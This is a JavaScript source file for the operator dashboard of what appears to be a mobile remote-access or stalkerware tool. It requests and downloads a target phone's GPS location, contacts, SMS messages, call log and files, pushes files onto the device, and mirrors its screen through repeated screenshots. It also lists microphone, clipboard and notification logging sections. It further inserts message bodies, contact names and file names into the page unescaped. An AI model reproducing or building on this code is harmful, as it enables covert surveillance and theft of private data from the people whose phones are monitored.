class DeviceManager {
    constructor() {
        this.devices = [];
        this.selectedDevice = null;
        this.currentDeviceId = null;
        this.map = null;
        this.currentPath = '/';
        this.pathHistory = [];
        this.mirroringInterval = null;
        this.isMirroring = false;
        this.init();
    }

    async init() {
        this.bindEvents();
        await this.loadDevices();
        setInterval(() => this.loadDevices(), 5000); // Refresh every 5 seconds
    }

    bindEvents() {
        // Sidebar navigation
        document.querySelectorAll('.sidebar-item').forEach(item => {
            item.addEventListener('click', (e) => {
                const section = e.currentTarget.getAttribute('data-section');
                this.showSection(section);
            });
        });

        // Device selector
        document.getElementById('device-selector').addEventListener('change', (e) => {
            this.selectDevice(e.target.value);
        });

        // Action buttons
        document.getElementById('request-location').addEventListener('click', () => this.requestLocation());
        document.getElementById('request-contacts').addEventListener('click', () => this.requestContacts());
        document.getElementById('download-contacts').addEventListener('click', () => this.downloadContacts());
        document.getElementById('request-sms').addEventListener('click', () => this.requestSMS());
        document.getElementById('download-sms').addEventListener('click', () => this.downloadSMS());
        document.getElementById('request-call-log').addEventListener('click', () => this.requestCallLog());
        document.getElementById('download-call-log').addEventListener('click', () => this.downloadCallLog());
        document.getElementById('refresh-files').addEventListener('click', () => this.requestFiles());
        document.getElementById('go-back').addEventListener('click', () => this.goBackDirectory());
        
        // Screen mirroring buttons
        document.getElementById('take-screenshot').addEventListener('click', () => this.takeScreenshot());
        document.getElementById('start-mirroring').addEventListener('click', () => this.startMirroring());
        document.getElementById('stop-mirroring').addEventListener('click', () => this.stopMirroring());
        
        // File upload
        document.getElementById('file-upload').addEventListener('change', (e) => this.handleFileUpload(e));
    }

    showSection(sectionName) {
        // Update sidebar active state
        document.querySelectorAll('.sidebar-item').forEach(item => {
            item.classList.remove('active');
        });
        document.querySelector(`[data-section="${sectionName}"]`).classList.add('active');

        // Update content sections
        document.querySelectorAll('.content-section').forEach(section => {
            section.classList.remove('active');
        });
        document.getElementById(`${sectionName}-section`).classList.add('active');

        // Update title
        const titles = {
            'info': 'Device Information',
            'gps': 'GPS Location',
            'microphone': 'Microphone Control',
            'contacts': 'Contacts',
            'call-log': 'Call Log',
            'clipboard': 'Clipboard Log',
            'notifications': 'Notification Log',
            'sms': 'SMS Manager',
            'wifi': 'WiFi Manager',
            'apps': 'Installed Apps',
            'permissions': 'Allowed Permissions',
            'file-explorer': 'File Explorer',
            'downloads': 'Downloads',
            'screen': 'Screen Mirror'
        };
        document.getElementById('content-title').textContent = titles[sectionName] || 'Device Manager';

        // Initialize section-specific functionality
        if (sectionName === 'gps') {
            setTimeout(() => this.initializeMap(), 100);
        }
    }

    async loadDevices() {
        try {
            const response = await fetch('/api/devices');
            this.devices = await response.json();
            this.updateDeviceSelector();
        } catch (error) {
            console.error('Error loading devices:', error);
        }
    }

    updateDeviceSelector() {
        const selector = document.getElementById('device-selector');
        const currentValue = selector.value;
        
        selector.innerHTML = this.devices.length > 0 
            ? this.devices.map(device => 
                `<option value="${device.id}" ${device.id === currentValue ? 'selected' : ''}>
                    ${device.deviceName} (${device.platform}) - ${device.isOnline ? 'Online' : 'Offline'}
                </option>`
              ).join('')
            : '<option value="">No devices connected</option>';

        // If we had a device selected and it's still available, keep it selected
        if (currentValue && this.devices.find(d => d.id === currentValue)) {
            selector.value = currentValue;
        } else if (this.devices.length > 0 && !currentValue) {
            // Auto-select first device if none selected
            selector.value = this.devices[0].id;
            this.selectDevice(this.devices[0].id);
        }
    }

    async selectDevice(deviceId) {
        if (!deviceId) {
            this.selectedDevice = null;
            this.currentDeviceId = null;
            this.updateDeviceStatus();
            return;
        }

        try {
            const response = await fetch(`/api/devices/${deviceId}`);
            this.selectedDevice = await response.json();
            this.currentDeviceId = deviceId;
            this.updateDeviceStatus();
            this.updateDeviceInfo();
            this.renderContacts();
            this.renderSMS();
            this.renderCallLog();
            this.renderFiles();
            
            // Update map if GPS section is active
            if (document.getElementById('gps-section').classList.contains('active')) {
                this.initializeMap();
            }
        } catch (error) {
            console.error('Error loading device details:', error);
        }
    }

    updateDeviceStatus() {
        const statusElement = document.getElementById('device-status');
        
        if (!this.selectedDevice) {
            statusElement.innerHTML = `
                <i class="fas fa-circle text-gray-400 mr-1"></i>
                No device selected
            `;
            statusElement.className = 'px-3 py-1 bg-gray-100 text-gray-600 text-sm rounded-full';
            return;
        }

        const isOnline = this.selectedDevice.isOnline;
        statusElement.innerHTML = `
            <i class="fas fa-circle ${isOnline ? 'text-green-500' : 'text-red-500'} mr-1"></i>
            ${this.selectedDevice.deviceName} - ${isOnline ? 'Online' : 'Offline'}
        `;
        statusElement.className = `px-3 py-1 ${isOnline ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'} text-sm rounded-full`;
    }

    updateDeviceInfo() {
        const infoElement = document.getElementById('device-info');
        
        if (!this.selectedDevice) {
            infoElement.innerHTML = '<p class="text-gray-500">Select a device to view information</p>';
            return;
        }

        infoElement.innerHTML = `
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="space-y-3">
                    <div class="flex items-center">
                        <i class="fas fa-mobile-alt w-5 h-5 mr-3 text-blue-600"></i>
                        <div>
                            <p class="text-sm font-medium text-gray-900">Device Name</p>
                            <p class="text-sm text-gray-600">${this.selectedDevice.deviceName}</p>
                        </div>
                    </div>
                    <div class="flex items-center">
                        <i class="fas fa-tag w-5 h-5 mr-3 text-blue-600"></i>
                        <div>
                            <p class="text-sm font-medium text-gray-900">Brand & Model</p>
                            <p class="text-sm text-gray-600">${this.selectedDevice.brand || 'Unknown'} ${this.selectedDevice.model || ''}</p>
                        </div>
                    </div>
                    <div class="flex items-center">
                        <i class="fab fa-${this.selectedDevice.platform?.toLowerCase() === 'ios' ? 'apple' : 'android'} w-5 h-5 mr-3 text-blue-600"></i>
                        <div>
                            <p class="text-sm font-medium text-gray-900">Platform</p>
                            <p class="text-sm text-gray-600">${this.selectedDevice.platform} ${this.selectedDevice.systemVersion || ''}</p>
                        </div>
                    </div>
                </div>
                <div class="space-y-3">
                    <div class="flex items-center">
                        <i class="fas fa-circle w-5 h-5 mr-3 ${this.selectedDevice.isOnline ? 'text-green-500' : 'text-red-500'}"></i>
                        <div>
                            <p class="text-sm font-medium text-gray-900">Status</p>
                            <p class="text-sm text-gray-600">${this.selectedDevice.isOnline ? 'Online' : 'Offline'}</p>
                        </div>
                    </div>
                    <div class="flex items-center">
                        <i class="fas fa-clock w-5 h-5 mr-3 text-blue-600"></i>
                        <div>
                            <p class="text-sm font-medium text-gray-900">Last Seen</p>
                            <p class="text-sm text-gray-600">${new Date(this.selectedDevice.lastSeen).toLocaleString()}</p>
                        </div>
                    </div>
                    <div class="flex items-center">
                        <i class="fas fa-map-marker-alt w-5 h-5 mr-3 text-blue-600"></i>
                        <div>
                            <p class="text-sm font-medium text-gray-900">Location</p>
                            <p class="text-sm text-gray-600">${this.selectedDevice.location ? 'Available' : 'Not available'}</p>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }

    initializeMap() {
        if (this.map) {
            this.map.remove();
        }
        
        const mapContainer = document.getElementById('map');
        if (!mapContainer) return;
        
        this.map = L.map(mapContainer).setView([40.7128, -74.0060], 10); // Default to NYC
        
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors'
        }).addTo(this.map);
        
        if (this.selectedDevice?.location) {
            const { latitude, longitude } = this.selectedDevice.location;
            this.map.setView([latitude, longitude], 15);
            
            L.marker([latitude, longitude])
                .addTo(this.map)
                .bindPopup(`${this.selectedDevice.deviceName}<br>Last updated: ${new Date(this.selectedDevice.location.timestamp).toLocaleString()}`)
                .openPopup();
                
            document.getElementById('location-info').innerHTML = `
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <p class="text-sm font-medium text-gray-900">Latitude</p>
                        <p class="text-sm text-gray-600">${latitude.toFixed(6)}</p>
                    </div>
                    <div>
                        <p class="text-sm font-medium text-gray-900">Longitude</p>
                        <p class="text-sm text-gray-600">${longitude.toFixed(6)}</p>
                    </div>
                    <div class="col-span-2">
                        <p class="text-sm font-medium text-gray-900">Last Updated</p>
                        <p class="text-sm text-gray-600">${new Date(this.selectedDevice.location.timestamp).toLocaleString()}</p>
                    </div>
                </div>
            `;
        } else {
            document.getElementById('location-info').innerHTML = `
                <p class="text-gray-500 text-center">No location data available</p>
            `;
        }
    }

    renderContacts() {
        const contactsList = document.getElementById('contacts-list');
        const contactsCount = document.getElementById('contacts-count');
        
        if (!this.selectedDevice) {
            contactsList.innerHTML = `
                <div class="p-4 text-center text-gray-500">
                    <i class="fas fa-address-book text-4xl mb-2 block text-gray-300"></i>
                    No device selected
                </div>
            `;
            contactsCount.textContent = '';
            return;
        }
        
        if (this.selectedDevice.contacts && this.selectedDevice.contacts.length > 0) {
            contactsList.innerHTML = `
                <div class="divide-y divide-gray-200">
                    ${this.selectedDevice.contacts.map(contact => `
                        <div class="flex items-center p-4 hover:bg-gray-50 transition-colors">
                            <div class="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center mr-4">
                                <i class="fas fa-user text-blue-600"></i>
                            </div>
                            <div class="flex-1">
                                <p class="text-sm font-medium text-gray-900">${contact.name || 'Unknown'}</p>
                                <p class="text-sm text-gray-500">
                                    ${contact.phoneNumbers && contact.phoneNumbers.length > 0 ? contact.phoneNumbers[0].number : 'No phone'}
                                </p>
                                ${contact.emails && contact.emails.length > 0 ? `
                                    <p class="text-xs text-gray-400">${contact.emails[0].email}</p>
                                ` : ''}
                            </div>
                        </div>
                    `).join('')}
                </div>
            `;
            
            contactsCount.innerHTML = `<i class="fas fa-users mr-1"></i>${this.selectedDevice.contacts.length} total contacts`;
        } else {
            contactsList.innerHTML = `
                <div class="p-4 text-center text-gray-500">
                    <i class="fas fa-address-book text-4xl mb-2 block text-gray-300"></i>
                    <p>No contacts available</p>
                    <p class="text-xs text-gray-400 mt-1">Click "Refresh" to load contacts</p>
                </div>
            `;
            contactsCount.textContent = '';
        }
    }

    renderSMS() {
        const smsList = document.getElementById('sms-list');
        const smsCount = document.getElementById('sms-count');
        
        if (!this.selectedDevice) {
            smsList.innerHTML = `
                <div class="p-4 text-center text-gray-500">
                    <i class="fas fa-sms text-4xl mb-2 block text-gray-300"></i>
                    No device selected
                </div>
            `;
            smsCount.textContent = '';
            return;
        }
        
        if (this.selectedDevice.sms?.error) {
            smsList.innerHTML = `
                <div class="p-4 text-center text-gray-500">
                    <i class="fas fa-exclamation-triangle text-yellow-500 text-2xl mb-2 block"></i>
                    <p class="text-sm text-gray-700 mb-2">${this.selectedDevice.sms.error}</p>
                    <p class="text-xs text-gray-500">SMS access requires native implementation</p>
                </div>
            `;
            smsCount.textContent = 'SMS access not available';
        } else if (this.selectedDevice.sms?.messages && this.selectedDevice.sms.messages.length > 0) {
            smsList.innerHTML = `
                <div class="divide-y divide-gray-200">
                    ${this.selectedDevice.sms.messages.map(message => `
                        <div class="flex items-start p-4 hover:bg-gray-50 transition-colors">
                            <div class="w-8 h-8 ${message.type === 'sent' ? 'bg-blue-100' : 'bg-green-100'} rounded-full flex items-center justify-center mr-3 mt-1">
                                <i class="fas fa-${message.type === 'sent' ? 'arrow-up' : 'arrow-down'} text-${message.type === 'sent' ? 'blue' : 'green'}-600 text-xs"></i>
                            </div>
                            <div class="flex-1">
                                <div class="flex items-center justify-between mb-1">
                                    <p class="text-sm font-medium text-gray-900">${message.address}</p>
                                    <span class="text-xs text-gray-500">${new Date(message.date).toLocaleString()}</span>
                                </div>
                                <p class="text-sm text-gray-700">${message.body}</p>
                            </div>
                        </div>
                    `).join('')}
                </div>
            `;
            
            smsCount.innerHTML = `<i class="fas fa-sms mr-1"></i>${this.selectedDevice.sms.messages.length} messages`;
        } else {
            smsList.innerHTML = `
                <div class="p-4 text-center text-gray-500">
                    <i class="fas fa-sms text-4xl mb-2 block text-gray-300"></i>
                    <p>No messages available</p>
                    <p class="text-xs text-gray-400 mt-1">Click "Load Messages" to fetch SMS</p>
                </div>
            `;
            smsCount.textContent = '';
        }
    }

    renderCallLog() {
        const callLogList = document.getElementById('call-log-list');
        const callLogCount = document.getElementById('call-log-count');
        
        if (!this.selectedDevice) {
            callLogList.innerHTML = `
                <div class="p-4 text-center text-gray-500">
                    <i class="fas fa-phone text-4xl mb-2 block text-gray-300"></i>
                    No device selected
                </div>
            `;
            callLogCount.textContent = '';
            return;
        }
        
        if (this.selectedDevice.callLog && this.selectedDevice.callLog.length > 0) {
            callLogList.innerHTML = `
                <div class="divide-y divide-gray-200">
                    ${this.selectedDevice.callLog.map(call => `
                        <div class="flex items-start p-4 hover:bg-gray-50 transition-colors">
                            <div class="w-8 h-8 ${this.getCallTypeColor(call.type)} rounded-full flex items-center justify-center mr-3 mt-1">
                                <i class="fas fa-${this.getCallTypeIcon(call.type)} text-white text-xs"></i>
                            </div>
                            <div class="flex-1">
                                <div class="flex items-center justify-between mb-1">
                                    <p class="text-sm font-medium text-gray-900">${call.name || call.phoneNumber}</p>
                                    <span class="text-xs text-gray-500">${new Date(call.timestamp).toLocaleString()}</span>
                                </div>
                                <p class="text-xs text-gray-500">${call.phoneNumber}</p>
                                <p class="text-xs text-gray-400">
                                    ${call.type} • ${call.duration > 0 ? this.formatDuration(call.duration) : 'No duration'}
                                </p>
                            </div>
                        </div>
                    `).join('')}
                </div>
            `;
            
            callLogCount.innerHTML = `<i class="fas fa-phone mr-1"></i>${this.selectedDevice.callLog.length} calls`;
        } else {
            callLogList.innerHTML = `
                <div class="p-4 text-center text-gray-500">
                    <i class="fas fa-phone text-4xl mb-2 block text-gray-300"></i>
                    <p>No call history available</p>
                    <p class="text-xs text-gray-400 mt-1">Click "Refresh" to load call history</p>
                </div>
            `;
            callLogCount.textContent = '';
        }
    }

    renderFiles() {
        const fileBrowser = document.getElementById('file-browser');
        const currentPath = document.getElementById('current-path');
        const goBackBtn = document.getElementById('go-back');
        
        if (!this.selectedDevice) {
            fileBrowser.innerHTML = `
                <div class="p-6 text-center text-gray-500">
                    <i class="fas fa-folder-open text-4xl mb-2 block text-gray-300"></i>
                    <p>No device selected</p>
                </div>
            `;
            return;
        }
        
        if (this.selectedDevice.currentPath) {
            currentPath.textContent = this.selectedDevice.currentPath;
            this.currentPath = this.selectedDevice.currentPath;
            goBackBtn.disabled = this.currentPath === '/' || this.currentPath === '/storage/emulated/0';
        }
        
        if (this.selectedDevice.files && Array.isArray(this.selectedDevice.files)) {
            // Sort files: folders first, then files, both alphabetically
            const sortedFiles = [...this.selectedDevice.files].sort((a, b) => {
                if (a.type === 'folder' && b.type !== 'folder') return -1;
                if (a.type !== 'folder' && b.type === 'folder') return 1;
                return a.name.localeCompare(b.name);
            });

            if (sortedFiles.length > 0) {
                fileBrowser.innerHTML = `
                    <div class="divide-y divide-gray-100">
                        ${sortedFiles.map(file => `
                            <div class="file-item flex items-center justify-between py-3 px-6 hover:bg-gray-50 transition-colors cursor-pointer" 
                                 onclick="deviceManager.${file.type === 'folder' ? `browseDirectory('${file.path}')` : `selectFile('${file.path}')`}">
                                <div class="flex items-center flex-1">
                                    <div class="w-10 h-10 flex items-center justify-center mr-4">
                                        ${file.type === 'folder' 
                                            ? '<i class="fas fa-folder text-blue-500 text-lg"></i>'
                                            : `<i class="fas fa-${this.getFileIcon(file.name)} text-lg"></i>`
                                        }
                                    </div>
                                    <div class="flex-1">
                                        <p class="text-sm font-medium text-gray-900">${file.name}</p>
                                        <p class="text-xs text-gray-500">
                                            ${file.type === 'folder' ? 'Folder' : this.formatFileSize(file.size)} • 
                                            ${new Date(file.lastModified).toLocaleDateString()}
                                            ${file.source ? ` • ${file.source}` : ''}
                                        </p>
                                    </div>
                                </div>
                                <div class="flex items-center space-x-2">
                                    ${file.type !== 'folder' ? `
                                        <button onclick="event.stopPropagation(); deviceManager.downloadFile('${file.path}')" 
                                                class="text-blue-600 hover:text-blue-700 p-2 rounded-lg hover:bg-blue-50 transition-colors" 
                                                title="Download">
                                            <i class="fas fa-download"></i>
                                        </button>
                                        <button onclick="event.stopPropagation(); deviceManager.shareFile('${file.path}')" 
                                                class="text-green-600 hover:text-green-700 p-2 rounded-lg hover:bg-green-50 transition-colors" 
                                                title="Share">
                                            <i class="fas fa-share"></i>
                                        </button>
                                    ` : ''}
                                    ${file.type === 'folder' ? `
                                        <i class="fas fa-chevron-right text-gray-400"></i>
                                    ` : ''}
                                </div>
                            </div>
                        `).join('')}
                    </div>
                `;
            } else {
                fileBrowser.innerHTML = `
                    <div class="p-6 text-center text-gray-500">
                        <i class="fas fa-folder-open text-4xl mb-2 block text-gray-300"></i>
                        <p>This folder is empty</p>
                        <p class="text-xs text-gray-400 mt-1">No files or folders found</p>
                    </div>
                `;
            }
        } else {
            fileBrowser.innerHTML = `
                <div class="p-6 text-center text-gray-500">
                    <i class="fas fa-folder-open text-4xl mb-2 block text-gray-300"></i>
                    <p>Click "Refresh" to browse device files</p>
                </div>
            `;
        }
    }

    getFileIcon(filename) {
        const ext = filename.split('.').pop()?.toLowerCase() || '';
        const iconMap = {
            'jpg': 'image text-green-500',
            'jpeg': 'image text-green-500',
            'png': 'image text-green-500',
            'gif': 'image text-green-500',
            'mp4': 'video text-red-500',
            'avi': 'video text-red-500',
            'mov': 'video text-red-500',
            'mp3': 'music text-purple-500',
            'wav': 'music text-purple-500',
            'pdf': 'file-pdf text-red-600',
            'doc': 'file-word text-blue-600',
            'docx': 'file-word text-blue-600',
            'txt': 'file-alt text-gray-500',
            'zip': 'file-archive text-yellow-600',
            'rar': 'file-archive text-yellow-600',
            'apk': 'mobile-alt text-green-600',
        };
        return iconMap[ext] || 'file text-gray-500';
    }

    formatFileSize(bytes) {
        if (!bytes || bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    getCallTypeColor(type) {
        switch (type) {
            case 'incoming': return 'bg-green-500';
            case 'outgoing': return 'bg-blue-500';
            case 'missed': return 'bg-red-500';
            default: return 'bg-gray-500';
        }
    }

    getCallTypeIcon(type) {
        switch (type) {
            case 'incoming': return 'phone';
            case 'outgoing': return 'phone';
            case 'missed': return 'phone-slash';
            default: return 'phone';
        }
    }

    formatDuration(seconds) {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
    }

    async takeScreenshot() {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/screenshot`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                document.getElementById('screen-display').innerHTML = `
                    <div class="text-center">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
                        <p class="text-sm text-gray-500">Taking screenshot...</p>
                    </div>
                `;
                
                // Check for screenshot after delay
                setTimeout(() => this.checkForScreenshot(), 2000);
            }
        } catch (error) {
            console.error('Error taking screenshot:', error);
            alert('Failed to take screenshot');
        }
    }

    async checkForScreenshot() {
        if (!this.currentDeviceId) return;
        
        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/latest-screenshot`);
            if (response.ok) {
                const blob = await response.blob();
                const imageUrl = URL.createObjectURL(blob);
                
                document.getElementById('screen-display').innerHTML = `
                    <img src="${imageUrl}" alt="Device Screenshot" class="max-w-full max-h-full object-contain rounded-lg">
                `;
            }
        } catch (error) {
            console.error('Error loading screenshot:', error);
        }
    }

    startMirroring() {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available');
            return;
        }

        this.isMirroring = true;
        document.getElementById('start-mirroring').style.display = 'none';
        document.getElementById('stop-mirroring').style.display = 'inline-flex';
        
        const refreshRate = parseInt(document.getElementById('refresh-rate').value);
        
        // Start continuous screenshots
        this.mirroringInterval = setInterval(() => {
            if (this.isMirroring) {
                this.takeScreenshot();
            }
        }, refreshRate);
        
        // Take initial screenshot
        this.takeScreenshot();
    }

    stopMirroring() {
        this.isMirroring = false;
        
        if (this.mirroringInterval) {
            clearInterval(this.mirroringInterval);
            this.mirroringInterval = null;
        }
        
        document.getElementById('start-mirroring').style.display = 'inline-flex';
        document.getElementById('stop-mirroring').style.display = 'none';
    }

    async handleFileUpload(event) {
        const files = event.target.files;
        if (!files.length || !this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available for file upload');
            return;
        }

        for (const file of files) {
            const formData = new FormData();
            formData.append('file', file);
            formData.append('targetPath', this.currentPath);

            try {
                const response = await fetch(`/api/devices/${this.currentDeviceId}/upload-file`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.success) {
                    console.log(`File ${file.name} uploaded successfully`);
                } else {
                    console.error(`Failed to upload ${file.name}`);
                }
            } catch (error) {
                console.error(`Error uploading ${file.name}:`, error);
            }
        }
        
        // Clear the input and refresh files
        event.target.value = '';
        setTimeout(() => this.requestFiles(), 1000);
        alert('Files uploaded successfully');
    }

    async browseDirectory(path) {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available for browsing');
            return;
        }

        try {
            // Add current path to history for back navigation
            if (this.currentPath !== path) {
                this.pathHistory.push(this.currentPath);
            }

            const response = await fetch(`/api/devices/${this.currentDeviceId}/browse-directory`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ path })
            });
            
            if (response.ok) {
                // Show loading state
                document.getElementById('file-browser').innerHTML = `
                    <div class="p-6 text-center text-gray-500">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
                        <p>Loading directory...</p>
                    </div>
                `;
                
                // Update current path immediately
                this.currentPath = path;
                document.getElementById('current-path').textContent = path;
                document.getElementById('go-back').disabled = this.pathHistory.length === 0;
                
                // Refresh device data after a short delay
                setTimeout(() => this.selectDevice(this.currentDeviceId), 2000);
            } else {
                throw new Error('Failed to browse directory');
            }
        } catch (error) {
            console.error('Error browsing directory:', error);
            alert('Failed to browse directory: ' + error.message);
        }
    }

    goBackDirectory() {
        if (this.pathHistory.length > 0) {
            const previousPath = this.pathHistory.pop();
            this.browseDirectory(previousPath);
        }
    }

    selectFile(filePath) {
        // For now, just show file info or download
        if (confirm(`Download file: ${filePath.split('/').pop()}?`)) {
            this.downloadFile(filePath);
        }
    }

    downloadFile(filePath) {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available for file download');
            return;
        }
        
        fetch(`/api/devices/${this.currentDeviceId}/download-file`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filePath })
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                alert('File download request sent. Check server logs for file content.');
            } else {
                alert('Failed to request file download');
            }
        })
        .catch(error => {
            console.error('Error requesting file download:', error);
            alert('Failed to request file download');
        });
    }

    shareFile(filePath) {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available for file sharing');
            return;
        }
        
        fetch(`/api/devices/${this.currentDeviceId}/share-file`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filePath })
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                alert('File shared successfully');
            } else {
                alert('Failed to share file');
            }
        })
        .catch(error => {
            console.error('Error sharing file:', error);
            alert('Failed to share file');
        });
    }

    async requestLocation() {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-location`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('location-info').innerHTML = `
                    <div class="text-center py-4">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-xl mb-2 block"></i>
                        <p class="text-sm text-gray-500">Requesting location from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.selectDevice(this.currentDeviceId), 3000);
            }
        } catch (error) {
            console.error('Error requesting location:', error);
            alert('Failed to request location');
        }
    }

    async requestContacts() {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-contacts`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('contacts-list').innerHTML = `
                    <div class="p-4 text-center text-gray-500">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
                        <p>Loading contacts from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.selectDevice(this.currentDeviceId), 3000);
            }
        } catch (error) {
            console.error('Error requesting contacts:', error);
            alert('Failed to request contacts');
        }
    }

    async requestSMS() {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-sms`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('sms-list').innerHTML = `
                    <div class="p-4 text-center text-gray-500">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
                        <p>Loading messages from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.selectDevice(this.currentDeviceId), 3000);
            }
        } catch (error) {
            console.error('Error requesting SMS:', error);
            alert('Failed to request SMS');
        }
    }

    async requestCallLog() {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-call-log`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('call-log-list').innerHTML = `
                    <div class="p-4 text-center text-gray-500">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
                        <p>Loading call history from device...</p>
                    </div>
                `;
                
                // Refresh device data after a short delay
                setTimeout(() => this.selectDevice(this.currentDeviceId), 3000);
            }
        } catch (error) {
            console.error('Error requesting call log:', error);
            alert('Failed to request call log');
        }
    }

    async requestFiles() {
        if (!this.currentDeviceId || !this.selectedDevice?.isOnline) {
            alert('Device is not available');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/request-files`, {
                method: 'POST'
            });
            const result = await response.json();
            
            if (result.success) {
                // Show loading state
                document.getElementById('file-browser').innerHTML = `
                    <div class="p-6 text-center text-gray-500">
                        <i class="fas fa-spinner fa-spin text-blue-600 text-2xl mb-2 block"></i>
                        <p>Loading files from device...</p>
                    </div>
                `;
                
                // Reset path history when refreshing
                this.pathHistory = [];
                
                // Refresh device data after a short delay
                setTimeout(() => this.selectDevice(this.currentDeviceId), 3000);
            }
        } catch (error) {
            console.error('Error requesting files:', error);
            alert('Failed to request files');
        }
    }

    async downloadContacts() {
        if (!this.currentDeviceId) {
            alert('No device selected');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/contacts/download`);
            const blob = await response.blob();
            
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `contacts-${this.selectedDevice.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        } catch (error) {
            console.error('Error downloading contacts:', error);
            alert('Failed to download contacts');
        }
    }

    async downloadSMS() {
        if (!this.currentDeviceId) {
            alert('No device selected');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/sms/download`);
            const blob = await response.blob();
            
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `sms-${this.selectedDevice.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        } catch (error) {
            console.error('Error downloading SMS:', error);
            alert('Failed to download SMS');
        }
    }

    async downloadCallLog() {
        if (!this.currentDeviceId) {
            alert('No device selected');
            return;
        }

        try {
            const response = await fetch(`/api/devices/${this.currentDeviceId}/call-log/download`);
            const blob = await response.blob();
            
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `call-log-${this.selectedDevice.deviceName.replace(/[^a-zA-Z0-9]/g, '_')}-${new Date().toISOString().split('T')[0]}.json`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        } catch (error) {
            console.error('Error downloading call log:', error);
            alert('Failed to download call log');
        }
    }
}

// Initialize the device manager when the page loads
const deviceManager = new DeviceManager();